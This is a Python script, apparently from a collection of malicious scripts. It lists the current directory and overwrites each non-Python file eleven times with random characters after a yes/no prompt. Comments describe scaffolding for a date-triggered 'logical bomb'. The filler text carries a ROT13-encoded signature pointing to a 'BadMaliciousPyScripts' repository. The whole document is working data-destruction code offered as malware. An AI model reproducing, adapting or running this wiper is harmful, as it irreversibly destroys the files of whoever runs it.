#!/usr/bin/env python3
import os
import string
import random
import time
from datetime import date
#Setup for a logical bomb if you want to but it isn't rly useful in this version ^^
today = date.today()
#target_day = date(today.year, 5, 19)
target_day = date.today()
# Define Some Variables and Arrays for later use these two Arrays are only to get random chracters
rnum = [
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "10", "11", "12", "13",
    "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25",
    "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37",
    "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49",
    "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61",
    "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73",
    "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85",
    "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97",
    "98", "99", "100"
]
ralp = [
    "A", "<", "K", "P", ":", ";", "-", "1", ")", "?", "#", "*", "®", "¶", "]",
    "$", "/", "%", "§", "²", "³", "[", "ß", "°", "^", "|", ".", ",", "_", "~",
    "`", "´", "&", "+", "{", "}", "µ", "»", "¦", "©", "«", "¬", "¼", "½", "¾",
    "¿", "Á", "Æ", "Ç", "È", "É", "Ê", "Ë", "Í", "Ì", "Î", "Ï", "Ð", "Ñ", "Ò",
    "Ó", "Õ", "×", "Ø", "Ù", "Ú", "Ý", "Þ", "ß", "æ", "ç", "ì", "í", "î", "ï",
    "÷", "ø", "ù", "ú", "û", "ü", "ý", "þ", "ÿ"
]
## m is a variable only to fill some half used if conditions; g is counting the passed files for a output; i is for the random character loop; c is counting the amount of time the will get overwritten; a is counting the skiped folders; fn is the filending for the searched files; l will be filled with random chracters to overwrite the file;
m = 1
g = 1
i = 1
c = 1
a = 1
fn = ""
l = ""
# Function to overwrite the file
def killfile():
    ftk = open(os.path.join(file), "w+")
    ftk.write(l)
    ftk.close()
    time.sleep(1)
# if statement for a logical bomb and loop for the l variable to fill it with random characters
if today == target_day:
    while i != 5000:
        i = i + 1
        l = l + "\n" + "\n" + random.choice(rnum) + "\n" + random.choice(ralp)
        if i == 5000:
            l = l + "Onfr64: OnqZnyvpvbhfClFpevcgf uggcf://tvguho.pbz/OnqZnyvpvbhfClFpevcgf \n\n:----:----:----:----:----:"
            print("Success!")
            break
else:
    print("Its not the right day")
    time.sleep(10)
# !!The main part!! Here it will checked if it is a folder a file or if it is the right fileending usw.
for file in os.listdir("."):
    if file.endswith(fn):
        if os.path.isfile(file):
            if file.endswith(".py"):
                m = m
            else:
                m = m + 1
                fn = os.path.join(file)
                f = input("Do you want to overwrite the file: "+ fn + "\n" + "-> ")
                if f == "Y" or f == "y" or f == "YES" or f == "Yes" or f == "yes":
                    print("200")
                    c = 1
                    print("---")
                    while c < 12:
                        c = c + 1
                        killfile()
                        if c == 12:
                            break
                else:
                    print("301")
                    print("---")
    if os.path.isfile(file):
        if file.endswith(fn):
            if file.endswith(".py"):
                print()
                print( str(g) + ". Passing: " + file + ":file")
                print()
                g = g + 1
        else:
            print()
            print( str(g) + ". Passing: " + file + ":file")
            print()
            g = g + 1
    else:
        print()
        print( str(a) + ". Passing: " + file + ":folder")
        print()
        a = a + 1
